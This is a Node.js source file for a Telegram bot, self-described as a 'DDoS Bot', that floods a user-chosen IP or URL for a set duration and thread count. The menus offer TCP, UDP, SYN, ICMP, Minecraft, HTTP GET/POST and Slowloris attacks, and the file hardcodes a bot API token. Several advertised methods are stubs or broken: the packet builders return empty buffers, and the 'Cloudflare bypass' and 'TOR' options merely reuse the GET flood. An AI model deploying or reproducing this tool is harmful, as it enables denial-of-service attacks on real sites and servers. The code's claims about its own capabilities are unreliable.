const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const { URL } = require('url');
const colors = require('colors');
const moment = require('moment');
const token = '7863322072:AAFLohSBYqeTpx8eLrsZz0YBD_4rEP627-4';
const bot = new TelegramBot(token, {polling: true});
colors.setTheme({
  info: 'green',
  warn: 'yellow',
  error: 'red',
  debug: 'blue',
  data: 'gray'
});
let attackRunning = false;
let attackStartTime = 0;
let requestsSent = 0;
let bytesSent = 0;
const mainMenu = {
  reply_markup: {
    keyboard: [
      ['🚀 Layer 4 Attacks', '🔥 Layer 7 Attacks'],
      ['📊 Stats', '⚙️ Settings'],
      ['🛑 Stop Attack', 'ℹ️ Help']
    ],
    resize_keyboard: true
  }
};
const layer4Menu = {
  reply_markup: {
    keyboard: [
      ['TCP Flood', 'UDP Flood', 'SYN Flood'],
      ['ICMP Flood', 'MINECRAFT', 'Back']
    ],
    resize_keyboard: true
  }
};
const layer7Menu = {
  reply_markup: {
    keyboard: [
      ['HTTP GET', 'HTTP POST', 'SLOWLORIS'],
      ['CF-Bypass', 'TOR Flood', 'Back']
    ],
    resize_keyboard: true
  }
};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '👋 Welcome to DDoS Bot! EXECUTOR LORDHOZOO\nChoose an option:', mainMenu);
});
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  if (text === '🚀 Layer 4 Attacks') {
    bot.sendMessage(chatId, 'Select Layer 4 attack method:', layer4Menu);
  } 
  else if (text === '🔥 Layer 7 Attacks') {
    bot.sendMessage(chatId, 'Select Layer 7 attack method:', layer7Menu);
  }
  else if (text === '📊 Stats') {
    sendStats(chatId);
  }
  else if (text === '🛑 Stop Attack') {
    stopAttack(chatId);
  }
  else if (text === 'ℹ️ Help') {
    sendHelp(chatId);
  }
  else if (text === 'Back') {
    bot.sendMessage(chatId, 'Main menu:', mainMenu);
  }
  else if (text === 'TCP Flood') {
    askTarget(chatId, 'TCP Flood');
  }
  else if (text === 'UDP Flood') {
    askTarget(chatId, 'UDP Flood');
  }
  else if (text === 'SYN Flood') {
    askTarget(chatId, 'SYN Flood');
  }
  else if (text === 'ICMP Flood') {
    askTarget(chatId, 'ICMP Flood');
  }
  else if (text === 'MINECRAFT') {
    askTarget(chatId, 'MINECRAFT');
  }
  else if (text === 'HTTP GET') {
    askTarget(chatId, 'HTTP GET');
  }
  else if (text === 'HTTP POST') {
    askTarget(chatId, 'HTTP POST');
  }
  else if (text === 'SLOWLORIS') {
    askTarget(chatId, 'SLOWLORIS');
  }
  else if (text === 'CF-Bypass') {
    askTarget(chatId, 'CF-Bypass');
  }
  else if (text === 'TOR Flood') {
    askTarget(chatId, 'TOR Flood');
  }
});
function askTarget(chatId, method) {
  bot.sendMessage(chatId, `Enter target for ${method} (ip:port or url):`);
  bot.once('message', (msg) => {
    if (msg.text === 'Back') return;
    const target = msg.text.trim();
    bot.sendMessage(chatId, 'Enter duration (seconds):');
    bot.once('message', (msg) => {
      if (msg.text === 'Back') return;
      const duration = parseInt(msg.text);
      if (isNaN(duration)) {
        bot.sendMessage(chatId, 'Invalid duration!');
        return;
      }
      bot.sendMessage(chatId, 'Enter threads:');
      bot.once('message', (msg) => {
        if (msg.text === 'Back') return;
        const threads = parseInt(msg.text);
        if (isNaN(threads)) {
          bot.sendMessage(chatId, 'Invalid thread count!');
          return;
        }
        startAttack(chatId, method, target, duration, threads);
      });
    });
  });
}
function startAttack(chatId, method, target, duration, threads) {
  if (attackRunning) {
    bot.sendMessage(chatId, '⚠️ Another attack is already running!');
    return;
  }
  attackRunning = true;
  attackStartTime = Date.now();
  requestsSent = 0;
  bytesSent = 0;
  let host, port;
  if (method in ['HTTP GET', 'HTTP POST', 'SLOWLORIS', 'CF-Bypass', 'TOR Flood']) {
    try {
      const url = new URL(target.startsWith('http') ? target : `http://${target}`);
      host = url.hostname;
      port = url.port || (url.protocol === 'https:' ? 443 : 80);
    } catch (e) {
      bot.sendMessage(chatId, '❌ Invalid URL!');
      attackRunning = false;
      return;
    }
  } else {
    const parts = target.split(':');
    if (parts.length !== 2) {
      bot.sendMessage(chatId, '❌ Invalid target format! Use ip:port');
      attackRunning = false;
      return;
    }
    host = parts[0];
    port = parseInt(parts[1]);
    if (isNaN(port) || port < 1 || port > 65535) {
      bot.sendMessage(chatId, '❌ Invalid port number!');
      attackRunning = false;
      return;
    }
  }
  bot.sendMessage(chatId, `🚀 Starting ${method} attack on ${target} for ${duration} seconds with ${threads} threads...`);
  const statsInterval = setInterval(() => {
    if (!attackRunning) {
      clearInterval(statsInterval);
      return;
    }
    sendStats(chatId);
  }, 5000);
  setTimeout(() => {
    stopAttack(chatId);
    clearInterval(statsInterval);
  }, duration * 1000);
  for (let i = 0; i < threads; i++) {
    setTimeout(() => {
      if (!attackRunning) return;
      
      switch (method) {
        case 'TCP Flood':
          tcpFlood(host, port);
          break;
        case 'UDP Flood':
          udpFlood(host, port);
          break;
        case 'SYN Flood':
          synFlood(host, port);
          break;
        case 'ICMP Flood':
          icmpFlood(host);
          break;
        case 'MINECRAFT':
          minecraftFlood(host, port);
          break;
        case 'HTTP GET':
          httpGetFlood(host, port);
          break;
        case 'HTTP POST':
          httpPostFlood(host, port);
          break;
        case 'SLOWLORIS':
          slowloris(host, port);
          break;
        case 'CF-Bypass':
          cfBypass(host, port);
          break;
        case 'TOR Flood':
          torFlood(host, port);
          break;
      }
    }, i * 100); 
  }
}
function stopAttack(chatId) {
  if (!attackRunning) {
    bot.sendMessage(chatId, '⚠️ No attack is currently running!');
    return;
  }
  
  attackRunning = false;
  const duration = (Date.now() - attackStartTime) / 1000;
  bot.sendMessage(chatId, `🛑 Attack stopped after ${duration.toFixed(2)} seconds\n` +
                         `📊 Total requests: ${requestsSent}\n` +
                         `📦 Total data sent: ${formatBytes(bytesSent)}`);
}
function sendStats(chatId) {
  if (!attackRunning) {
    bot.sendMessage(chatId, '⚠️ No attack is currently running!');
    return;
  }
  const duration = (Date.now() - attackStartTime) / 1000;
  const rps = (requestsSent / duration).toFixed(2);
  const bps = (bytesSent / duration).toFixed(2);
  
  bot.sendMessage(chatId, `📊 Attack Stats:\n` +
                         `⏱ Duration: ${duration.toFixed(2)}s\n` +
                         `📨 Requests: ${requestsSent}\n` +
                         `🚀 RPS: ${rps}\n` +
                         `📦 Data: ${formatBytes(bytesSent)}\n` +
                         `📡 BPS: ${formatBytes(bps)}/s`);
}
function sendHelp(chatId) {
  const helpText = `🆘 *Help Guide* 🆘
*Layer 4 Attacks*:
- TCP Flood: Floods target with TCP packets
- UDP Flood: Floods target with UDP packets
- SYN Flood: SYN packet flood (requires raw socket)
- ICMP Flood: Ping flood (requires raw socket)
- MINECRAFT: Minecraft server flood

*Layer 7 Attacks*:
- HTTP GET: HTTP GET request flood
- HTTP POST: HTTP POST request flood
- SLOWLORIS: Slowloris attack
- CF-Bypass: Cloudflare bypass attack
- TOR Flood: Flood through TOR network

*Other Commands*:
- 📊 Stats: Show attack statistics
- 🛑 Stop Attack: Stop current attack
- ⚙️ Settings: Configure bot settings

*Usage*:
1. Select attack type
2. Enter target (ip:port or URL)
3. Enter duration (seconds)
4. Enter thread count`;

  bot.sendMessage(chatId, helpText, {parse_mode: 'Markdown'});
}
function formatBytes(bytes) {
  if (bytes === 0) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}
function tcpFlood(host, port) {
  const client = new net.Socket();
  client.connect(port, host, () => {
    while (attackRunning) {
      client.write(generateRandomBuffer(1024));
      requestsSent++;
      bytesSent += 1024;
    }
    client.destroy();
  });
  client.on('error', () => client.destroy());
}
function udpFlood(host, port) {
  const client = dgram.createSocket('udp4');
  const sendPacket = () => {
    if (!attackRunning) {
      client.close();
      return;
    }
    client.send(generateRandomBuffer(1024), port, host, (err) => {
      if (!err) {
        requestsSent++;
        bytesSent += 1024;
      }
      setTimeout(sendPacket, 10);
    });
  };
  sendPacket();
}
function synFlood(host, port) {
  const raw = require('raw-socket');
  const socket = raw.createSocket({
    protocol: raw.Protocol.TCP
  });
  const packet = buildSynPacket(host, port);
  const sendPacket = () => {
    if (!attackRunning) {
      socket.close();
      return;
    }
    raw.write(socket, packet, 0, packet.length, host, (err) => {
      if (!err) {
        requestsSent++;
        bytesSent += packet.length;
      }
      setTimeout(sendPacket, 10);
    });
  };
  
  sendPacket();
}
function icmpFlood(host) {
  const raw = require('raw-socket');
  const socket = raw.createSocket({
    protocol: raw.Protocol.ICMP
  });
  const packet = buildIcmpPacket();
  const sendPacket = () => {
    if (!attackRunning) {
      socket.close();
      return;
    }
    raw.write(socket, packet, 0, packet.length, host, (err) => {
      if (!err) {
        requestsSent++;
        bytesSent += packet.length;
      }
      setTimeout(sendPacket, 10);
    });
  };
  sendPacket();
}
function minecraftFlood(host, port) {
  const client = new net.Socket();
  client.connect(port, host, () => {
    const handshake = buildMinecraftHandshake(host, port);
    client.write(handshake);
    bytesSent += handshake.length;
    const keepAlive = () => {
      if (!attackRunning) {
        client.destroy();
        return;
      }
      client.write(buildMinecraftKeepAlive());
      bytesSent += 10; 
      setTimeout(keepAlive, 1000);
    };
    keepAlive();
  });
  client.on('error', () => client.destroy());
}
function httpGetFlood(host, port) {
  const options = {
    hostname: host,
    port: port,
    path: '/',
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Connection': 'keep-alive'
    }
  };
  const sendRequest = () => {
    if (!attackRunning) return;
    const req = (port === 443 ? https : http).request(options, (res) => {
      res.on('data', () => {});
      res.on('end', () => {
        requestsSent++;
        bytesSent += parseInt(res.headers['content-length'] || '0');
        setTimeout(sendRequest, 100);
      });
    });
    req.on('error', () => {});
    req.end();
  };
  sendRequest();
}
function httpPostFlood(host, port) {
  const options = {
    hostname: host,
    port: port,
    path: '/',
    method: 'POST',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': 100,
      'Connection': 'keep-alive'
    }
  };
  const postData = 'data=' + generateRandomString(90);
  const sendRequest = () => {
    if (!attackRunning) return;
    const req = (port === 443 ? https : http).request(options, (res) => {
      res.on('data', () => {});
      res.on('end', () => {
        requestsSent++;
        bytesSent += parseInt(res.headers['content-length'] || '0') + 100;
        setTimeout(sendRequest, 100);
      });
    });
    req.on('error', () => {});
    req.write(postData);
    req.end();
  };
  sendRequest();
}
function slowloris(host, port) {
  const options = {
    hostname: host,
    port: port,
    path: '/',
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Connection': 'keep-alive'
    }
  };
  for (let i = 0; i < 10; i++) {
    setTimeout(() => {
      const connections = [];
      
      const createConnection = () => {
        if (!attackRunning) {
          connections.forEach(conn => conn.destroy());
          return;
        }
        const req = (port === 443 ? https : http).request(options);
        req.on('error', () => {});
        req.write(`${options.method} ${options.path} HTTP/1.1\r\n`);
        req.write(`Host: ${host}\r\n`);
        req.write(`User-Agent: ${options.headers['User-Agent']}\r\n`);
        connections.push(req);
        const keepAlive = () => {
          if (!attackRunning) {
            req.destroy();
            return;
          }
          req.write(`X-a: ${Math.random()}\r\n`);
          setTimeout(keepAlive, 10000);
        };
        
        keepAlive();
      };
      const createConnections = () => {
        if (!attackRunning) return;
        createConnection();
        setTimeout(createConnections, 1000);
      };
      createConnections();
    }, i * 1000);
  }
}
function cfBypass(host, port) {
  httpGetFlood(host, port); 
}

function torFlood(host, port) {
  httpGetFlood(host, port); 
}
function generateRandomBuffer(size) {
  const buf = Buffer.alloc(size);
  for (let i = 0; i < size; i++) {
    buf[i] = Math.floor(Math.random() * 256);
  }
  return buf;
}
function generateRandomString(length) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function buildSynPacket(destIP, destPort) {
  const packet = Buffer.alloc(60);
  return packet;
}

function buildIcmpPacket() {
  const packet = Buffer.alloc(64);
  return packet;
}

function buildMinecraftHandshake(host, port) {
  const packet = Buffer.alloc(100);
  return packet;
}

function buildMinecraftKeepAlive() {
  const packet = Buffer.alloc(10);
  return packet;
}

console.log('Bot is running...');
